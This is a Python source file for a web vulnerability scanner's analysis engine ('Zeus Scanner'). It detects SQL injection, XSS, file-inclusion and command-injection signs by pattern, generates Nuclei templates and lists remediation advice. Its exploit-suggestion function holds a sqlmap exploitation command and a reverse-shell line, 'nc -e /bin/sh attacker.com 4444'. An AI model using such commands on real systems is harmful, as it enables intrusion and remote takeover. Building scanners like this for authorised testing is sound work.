#!/usr/bin/env python3

"""
Enhanced AI Engine - Combines static knowledge base with dynamic online payload fetching
Creates Nuclei-style YAML templates and provides advanced vulnerability analysis
"""

import yaml
import json
import re
import hashlib
import time
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
from .comprehensive_knowledge_base import ComprehensiveKnowledgeBase
from .dynamic_payload_fetcher import DynamicPayloadFetcher
import logging

class EnhancedAIEngine:
    """
    Advanced AI engine with massive vulnerability knowledge and dynamic payload fetching
    """
    
    def __init__(self):
        self.knowledge_base = ComprehensiveKnowledgeBase()
        self.payload_fetcher = DynamicPayloadFetcher()
        self.dynamic_payloads = {}
        self.generated_templates = []
        self.vulnerability_patterns = {}
        
        # Initialize with comprehensive patterns
        self._load_vulnerability_patterns()
        
        # Fetch latest payloads from online sources
        self._initialize_dynamic_payloads()
    
    def _load_vulnerability_patterns(self):
        """Load comprehensive vulnerability patterns"""
        self.vulnerability_patterns = {
            'sql_injection': {
                'error_patterns': self.knowledge_base.get_sql_patterns()['error_signatures'],
                'payloads': self.knowledge_base.get_sql_patterns()['payloads_massive'],
                'severity': 'high',
                'cwe': 'CWE-89'
            },
            'xss': {
                'contexts': self.knowledge_base.get_xss_patterns()['contexts'],
                'bypasses': self.knowledge_base.get_xss_patterns()['bypass_techniques'],
                'severity': 'medium',
                'cwe': 'CWE-79'
            },
            'lfi_rfi': {
                'files': self.knowledge_base.get_lfi_patterns()['linux_files'] + 
                         self.knowledge_base.get_lfi_patterns()['windows_files'],
                'traversals': self.knowledge_base.get_lfi_patterns()['traversal_payloads'],
                'wrappers': self.knowledge_base.get_lfi_patterns()['php_wrappers'],
                'severity': 'high',
                'cwe': 'CWE-22'
            },
            'command_injection': {
                'unix_payloads': self.knowledge_base.get_command_injection_patterns()['unix_payloads'],
                'windows_payloads': self.knowledge_base.get_command_injection_patterns()['windows_payloads'],
                'severity': 'critical',
                'cwe': 'CWE-78'
            }
        }
    
    def _initialize_dynamic_payloads(self):
        """Initialize dynamic payloads from online sources"""
        print("[*] Fetching latest payloads from online sources...")
        try:
            self.dynamic_payloads = self.payload_fetcher.fetch_all_payloads()
            print("[+] Dynamic payload fetching completed!")
        except Exception as e:
            print(f"[-] Error fetching dynamic payloads: {e}")
            self.dynamic_payloads = {}
    
    def analyze_response(self, response_text: str, url: str, payload: str) -> Dict[str, Any]:
        """
        Analyze response for vulnerabilities using comprehensive patterns
        """
        analysis_result = {
            'vulnerabilities_found': [],
            'confidence_score': 0.0,
            'severity': 'info',
            'recommendations': [],
            'nuclei_template': None,
            'exploit_suggestions': []
        }
        
        # SQL Injection Analysis
        sql_result = self._analyze_sql_injection(response_text, url, payload)
        if sql_result['found']:
            analysis_result['vulnerabilities_found'].append(sql_result)
            analysis_result['confidence_score'] = max(analysis_result['confidence_score'], sql_result['confidence'])
        
        # XSS Analysis
        xss_result = self._analyze_xss(response_text, url, payload)
        if xss_result['found']:
            analysis_result['vulnerabilities_found'].append(xss_result)
            analysis_result['confidence_score'] = max(analysis_result['confidence_score'], xss_result['confidence'])
        
        # LFI/RFI Analysis
        lfi_result = self._analyze_lfi_rfi(response_text, url, payload)
        if lfi_result['found']:
            analysis_result['vulnerabilities_found'].append(lfi_result)
            analysis_result['confidence_score'] = max(analysis_result['confidence_score'], lfi_result['confidence'])
        
        # Command Injection Analysis
        cmd_result = self._analyze_command_injection(response_text, url, payload)
        if cmd_result['found']:
            analysis_result['vulnerabilities_found'].append(cmd_result)
            analysis_result['confidence_score'] = max(analysis_result['confidence_score'], cmd_result['confidence'])
        
        # Determine overall severity
        if analysis_result['vulnerabilities_found']:
            severities = [vuln['severity'] for vuln in analysis_result['vulnerabilities_found']]
            severity_ranking = {'critical': 4, 'high': 3, 'medium': 2, 'low': 1, 'info': 0}
            analysis_result['severity'] = max(severities, key=lambda x: severity_ranking.get(x, 0))
            
            # Generate Nuclei template
            analysis_result['nuclei_template'] = self._generate_nuclei_template(analysis_result)
            
            # Get exploit suggestions
            analysis_result['exploit_suggestions'] = self._get_exploit_suggestions(analysis_result)
            
            # Generate recommendations
            analysis_result['recommendations'] = self._generate_recommendations(analysis_result)
        
        return analysis_result
    
    def _analyze_sql_injection(self, response_text: str, url: str, payload: str) -> Dict[str, Any]:
        """Analyze for SQL injection vulnerabilities"""
        result = {
            'type': 'sql_injection',
            'found': False,
            'confidence': 0.0,
            'severity': 'high',
            'details': {},
            'evidence': [],
            'payloads': []
        }
        
        # Check for database error signatures
        for db_type, signatures in self.vulnerability_patterns['sql_injection']['error_patterns'].items():
            for signature in signatures:
                if re.search(signature, response_text, re.IGNORECASE):
                    result['found'] = True
                    result['confidence'] = min(result['confidence'] + 0.3, 0.95)
                    result['details']['database_type'] = db_type
                    result['evidence'].append(f"Database error signature found: {signature}")
        
        # Check for successful injection indicators
        injection_indicators = [
            r'Query failed',
            r'SQL syntax.*error',
            r'mysql_fetch_array',
            r'PostgreSQL.*ERROR',
            r'Warning.*mysql_.*',
            r'valid MySQL result',
            r'Microsoft.*ODBC.*SQL Server',
            r'ORA-\d{5}',
            r'SQLite.*error'
        ]
        
        for indicator in injection_indicators:
            if re.search(indicator, response_text, re.IGNORECASE):
                result['found'] = True
                result['confidence'] = min(result['confidence'] + 0.2, 0.95)
                result['evidence'].append(f"SQL injection indicator: {indicator}")
        
        # If vulnerability found, generate additional payloads
        if result['found']:
            db_type = result['details'].get('database_type', 'mysql')
            static_payloads = self.vulnerability_patterns['sql_injection']['payloads'][f'{db_type}'] if db_type in self.vulnerability_patterns['sql_injection']['payloads'] else []
            dynamic_payloads = list(self.dynamic_payloads.get('sql_injection', set()))
            
            result['payloads'] = list(set(static_payloads + dynamic_payloads))[:50]  # Limit to 50 best payloads
        
        return result
    
    def _analyze_xss(self, response_text: str, url: str, payload: str) -> Dict[str, Any]:
        """Analyze for XSS vulnerabilities"""
        result = {
            'type': 'xss',
            'found': False,
            'confidence': 0.0,
            'severity': 'medium',
            'details': {},
            'evidence': [],
            'payloads': []
        }
        
        # Check if payload is reflected in response
        if payload in response_text:
            result['found'] = True
            result['confidence'] += 0.4
            result['evidence'].append(f"Payload reflected in response: {payload}")
            
            # Determine XSS context
            contexts = ['html_context', 'attribute_context', 'javascript_context', 'css_context', 'url_context']
            for context in contexts:
                if self._check_xss_context(response_text, payload, context):
                    result['details']['context'] = context
                    result['confidence'] += 0.2
                    break
        
        # Check for XSS execution indicators
        xss_indicators = [
            r'<script[^>]*>.*?</script>',
            r'javascript:',
            r'onerror\s*=',
            r'onload\s*=',
            r'onclick\s*=',
            r'alert\s*\(',
            r'confirm\s*\(',
            r'prompt\s*\('
        ]
        
        for indicator in xss_indicators:
            if re.search(indicator, response_text, re.IGNORECASE):
                result['found'] = True
                result['confidence'] = min(result['confidence'] + 0.1, 0.9)
                result['evidence'].append(f"XSS indicator found: {indicator}")
        
        # Generate context-appropriate payloads
        if result['found']:
            context = result['details'].get('context', 'html_context')
            static_payloads = self.vulnerability_patterns['xss']['contexts'].get(context, [])
            bypass_payloads = self.vulnerability_patterns['xss']['bypasses']['waf_bypass']
            dynamic_payloads = list(self.dynamic_payloads.get('xss', set()))
            
            result['payloads'] = list(set(static_payloads + bypass_payloads + dynamic_payloads))[:50]
        
        return result
    
    def _analyze_lfi_rfi(self, response_text: str, url: str, payload: str) -> Dict[str, Any]:
        """Analyze for LFI/RFI vulnerabilities"""
        result = {
            'type': 'lfi_rfi',
            'found': False,
            'confidence': 0.0,
            'severity': 'high',
            'details': {},
            'evidence': [],
            'payloads': []
        }
        
        # Check for file inclusion signatures
        lfi_signatures = [
            r'root:x:0:0:',  # /etc/passwd
            r'\[boot loader\]',  # boot.ini
            r'\[fonts\]',  # win.ini
            r'<\?php',  # PHP file inclusion
            r'Warning.*include.*failed to open stream',
            r'Warning.*require.*failed opening required',
            r'No such file or directory',
            r'Permission denied',
            r'Failed opening.*for inclusion'
        ]
        
        for signature in lfi_signatures:
            if re.search(signature, response_text, re.IGNORECASE):
                result['found'] = True
                result['confidence'] = min(result['confidence'] + 0.3, 0.95)
                result['evidence'].append(f"File inclusion signature: {signature}")
        
        # Check for directory traversal success
        if '../' in payload or '..\\' in payload:
            if any(indicator in response_text for indicator in ['root:', 'Administrator:', 'bin/bash', 'cmd.exe']):
                result['found'] = True
                result['confidence'] += 0.4
                result['details']['type'] = 'directory_traversal'
        
        # Check for PHP wrapper usage
        if 'php://' in payload:
            if 'base64' in response_text or len(response_text) > 1000:
                result['found'] = True
                result['confidence'] += 0.3
                result['details']['type'] = 'php_wrapper'
        
        # Generate appropriate payloads
        if result['found']:
            traversal_payloads = self.vulnerability_patterns['lfi_rfi']['traversals']
            file_payloads = self.vulnerability_patterns['lfi_rfi']['files']
            wrapper_payloads = self.vulnerability_patterns['lfi_rfi']['wrappers']
            dynamic_payloads = list(self.dynamic_payloads.get('lfi_rfi', set()))
            
            result['payloads'] = list(set(traversal_payloads + file_payloads + wrapper_payloads + dynamic_payloads))[:50]
        
        return result
    
    def _analyze_command_injection(self, response_text: str, url: str, payload: str) -> Dict[str, Any]:
        """Analyze for command injection vulnerabilities"""
        result = {
            'type': 'command_injection',
            'found': False,
            'confidence': 0.0,
            'severity': 'critical',
            'details': {},
            'evidence': [],
            'payloads': []
        }
        
        # Check for command execution indicators
        cmd_indicators = [
            r'uid=\d+.*gid=\d+',  # Unix id command
            r'root:.*:\d+:\d+:',  # Unix passwd output
            r'Windows.*Version.*\d+\.\d+',  # Windows version
            r'Volume in drive.*is',  # Windows dir command
            r'Directory of.*',  # Windows dir
            r'total \d+',  # Unix ls -l
            r'drwx.*',  # Unix permissions
            r'\d+\s+\d+\s+\d+\s+\w+\s+\w+',  # Process list
            r'PING.*\(\d+\.\d+\.\d+\.\d+\)',  # Ping output
            r'Usage:.*\[options\]'  # Command help output
        ]
        
        for indicator in cmd_indicators:
            if re.search(indicator, response_text, re.IGNORECASE):
                result['found'] = True
                result['confidence'] = min(result['confidence'] + 0.3, 0.95)
                result['evidence'].append(f"Command execution indicator: {indicator}")
        
        # Check for time-based indicators (if response took longer than expected)
        # This would need to be implemented with timing information
        
        # Detect operating system
        if any(indicator in response_text.lower() for indicator in ['windows', 'microsoft', 'dir ', 'c:\\']):
            result['details']['os'] = 'windows'
        elif any(indicator in response_text.lower() for indicator in ['linux', 'unix', 'bash', '/bin/', '/etc/']):
            result['details']['os'] = 'unix'
        
        # Generate OS-specific payloads
        if result['found']:
            os_type = result['details'].get('os', 'unix')
            if os_type == 'windows':
                static_payloads = self.vulnerability_patterns['command_injection']['windows_payloads']
            else:
                static_payloads = self.vulnerability_patterns['command_injection']['unix_payloads']
            
            dynamic_payloads = list(self.dynamic_payloads.get('command_injection', set()))
            result['payloads'] = list(set(static_payloads + dynamic_payloads))[:50]
        
        return result
    
    def _check_xss_context(self, response_text: str, payload: str, context: str) -> bool:
        """Check if XSS payload is in specific context"""
        payload_pos = response_text.find(payload)
        if payload_pos == -1:
            return False
        
        # Get surrounding context (100 chars before and after)
        start = max(0, payload_pos - 100)
        end = min(len(response_text), payload_pos + len(payload) + 100)
        context_text = response_text[start:end]
        
        context_patterns = {
            'html_context': [r'<[^>]*>', r'</[^>]*>'],
            'attribute_context': [r'<[^>]*\s+\w+\s*=\s*["\']', r'["\'][^>]*>'],
            'javascript_context': [r'<script[^>]*>', r'</script>'],
            'css_context': [r'<style[^>]*>', r'</style>'],
            'url_context': [r'href\s*=', r'src\s*=', r'action\s*=']
        }
        
        patterns = context_patterns.get(context, [])
        return any(re.search(pattern, context_text, re.IGNORECASE) for pattern in patterns)
    
    def _generate_nuclei_template(self, analysis_result: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Nuclei template for discovered vulnerability"""
        if not analysis_result['vulnerabilities_found']:
            return None
        
        primary_vuln = analysis_result['vulnerabilities_found'][0]
        vuln_type = primary_vuln['type']
        
        # Generate unique template ID
        template_id = f"zeus-{vuln_type}-{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
        
        template = {
            'id': template_id,
            'info': {
                'name': f"Zeus Scanner - {vuln_type.replace('_', ' ').title()} Detection",
                'author': 'Zeus-Scanner AI Engine',
                'severity': primary_vuln['severity'],
                'description': f"Detects {vuln_type.replace('_', ' ')} vulnerability",
                'classification': {
                    'cwe-id': self.vulnerability_patterns[vuln_type]['cwe']
                },
                'tags': [vuln_type.replace('_', '-'), 'zeus-scanner', 'ai-generated']
            },
            'http': [
                {
                    'method': 'GET',
                    'path': ['{{BaseURL}}'],
                    'headers': {
                        'User-Agent': 'Zeus-Scanner/1.0'
                    }
                }
            ],
            'matchers-condition': 'and',
            'matchers': []
        }
        
        # Add vulnerability-specific matchers
        if vuln_type == 'sql_injection':
            template['http'][0]['payloads'] = {
                'injection': primary_vuln.get('payloads', [])[:10]  # First 10 payloads
            }
            template['matchers'].extend([
                {
                    'type': 'regex',
                    'regex': [
                        r'mysql_fetch_array\(\)',
                        r'PostgreSQL.*ERROR',
                        r'Microsoft.*ODBC.*SQL Server',
                        r'ORA-\d{5}'
                    ]
                },
                {
                    'type': 'status',
                    'status': [200, 500]
                }
            ])
        
        elif vuln_type == 'xss':
            template['http'][0]['payloads'] = {
                'xss': primary_vuln.get('payloads', [])[:10]
            }
            template['matchers'].extend([
                {
                    'type': 'word',
                    'words': ['<script>', 'alert(', 'javascript:']
                },
                {
                    'type': 'status',
                    'status': [200]
                }
            ])
        
        elif vuln_type == 'lfi_rfi':
            template['http'][0]['payloads'] = {
                'lfi': primary_vuln.get('payloads', [])[:10]
            }
            template['matchers'].extend([
                {
                    'type': 'regex',
                    'regex': [
                        r'root:x:0:0:',
                        r'\[boot loader\]',
                        r'<\?php'
                    ]
                },
                {
                    'type': 'status',
                    'status': [200]
                }
            ])
        
        elif vuln_type == 'command_injection':
            template['http'][0]['payloads'] = {
                'cmd': primary_vuln.get('payloads', [])[:10]
            }
            template['matchers'].extend([
                {
                    'type': 'regex',
                    'regex': [
                        r'uid=\d+.*gid=\d+',
                        r'Windows.*Version.*\d+\.\d+',
                        r'Directory of.*'
                    ]
                },
                {
                    'type': 'status',
                    'status': [200]
                }
            ])
        
        self.generated_templates.append(template)
        return template
    
    def _get_exploit_suggestions(self, analysis_result: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Get exploit suggestions based on vulnerabilities found"""
        suggestions = []
        
        for vuln in analysis_result['vulnerabilities_found']:
            vuln_type = vuln['type']
            
            # Search for relevant exploits from dynamic data
            exploits = self.payload_fetcher.search_exploits(vuln_type.replace('_', ' '))
            
            for exploit in exploits[:5]:  # Top 5 exploits
                suggestions.append({
                    'type': 'exploit',
                    'vulnerability': vuln_type,
                    'exploit_id': exploit.get('id'),
                    'description': exploit.get('description'),
                    'platform': exploit.get('platform'),
                    'author': exploit.get('author'),
                    'severity': vuln['severity']
                })
            
            # Add manual exploitation suggestions
            if vuln_type == 'sql_injection':
                suggestions.append({
                    'type': 'manual',
                    'vulnerability': vuln_type,
                    'description': 'Use sqlmap for automated exploitation',
                    'command': f"sqlmap -u '{vuln.get('url', '')}' --batch --dbs",
                    'severity': vuln['severity']
                })
            
            elif vuln_type == 'command_injection':
                suggestions.append({
                    'type': 'manual',
                    'vulnerability': vuln_type,
                    'description': 'Establish reverse shell connection',
                    'command': 'nc -e /bin/sh attacker.com 4444',
                    'severity': vuln['severity']
                })
        
        return suggestions
    
    def _generate_recommendations(self, analysis_result: Dict[str, Any]) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        for vuln in analysis_result['vulnerabilities_found']:
            vuln_type = vuln['type']
            
            if vuln_type == 'sql_injection':
                recommendations.extend([
                    "Use parameterized queries or prepared statements",
                    "Implement proper input validation and sanitization",
                    "Use least privilege database accounts",
                    "Enable SQL query logging and monitoring",
                    "Implement Web Application Firewall (WAF) rules"
                ])
            
            elif vuln_type == 'xss':
                recommendations.extend([
                    "Implement proper output encoding/escaping",
                    "Use Content Security Policy (CSP) headers",
                    "Validate and sanitize all user inputs",
                    "Use framework-provided XSS protection mechanisms",
                    "Implement HTTPOnly and Secure flags on cookies"
                ])
            
            elif vuln_type == 'lfi_rfi':
                recommendations.extend([
                    "Implement strict file path validation",
                    "Use whitelist approach for file inclusion",
                    "Disable dangerous PHP functions if applicable",
                    "Implement proper access controls",
                    "Use relative paths and validate file extensions"
                ])
            
            elif vuln_type == 'command_injection':
                recommendations.extend([
                    "Avoid system command execution with user input",
                    "Use safe APIs instead of shell commands",
                    "Implement strict input validation and whitelisting",
                    "Run applications with minimal privileges",
                    "Use containerization for isolation"
                ])
        
        return list(set(recommendations))  # Remove duplicates
    
    def export_nuclei_templates(self, output_file: str = 'zeus_generated_templates.yaml'):
        """Export all generated Nuclei templates to file"""
        if self.generated_templates:
            with open(output_file, 'w') as f:
                yaml.dump_all(self.generated_templates, f, default_flow_style=False, indent=2)
            print(f"[+] Exported {len(self.generated_templates)} Nuclei templates to {output_file}")
        else:
            print("[-] No templates generated yet")
    
    def get_vulnerability_stats(self) -> Dict[str, Any]:
        """Get statistics about available vulnerability data"""
        stats = {
            'static_knowledge_base': {
                'sql_patterns': len(self.vulnerability_patterns['sql_injection']['payloads']),
                'xss_patterns': len(self.vulnerability_patterns['xss']['contexts']),
                'lfi_patterns': len(self.vulnerability_patterns['lfi_rfi']['files']),
                'command_patterns': len(self.vulnerability_patterns['command_injection']['unix_payloads'])
            },
            'dynamic_payloads': {
                'sql_injection': len(self.dynamic_payloads.get('sql_injection', set())),
                'xss': len(self.dynamic_payloads.get('xss', set())),
                'lfi_rfi': len(self.dynamic_payloads.get('lfi_rfi', set())),
                'command_injection': len(self.dynamic_payloads.get('command_injection', set()))
            },
            'nuclei_templates': len(self.dynamic_payloads.get('nuclei_templates', [])),
            'cve_entries': len(self.dynamic_payloads.get('cve_data', [])),
            'exploits': len(self.dynamic_payloads.get('exploits', [])),
            'generated_templates': len(self.generated_templates)
        }
        return stats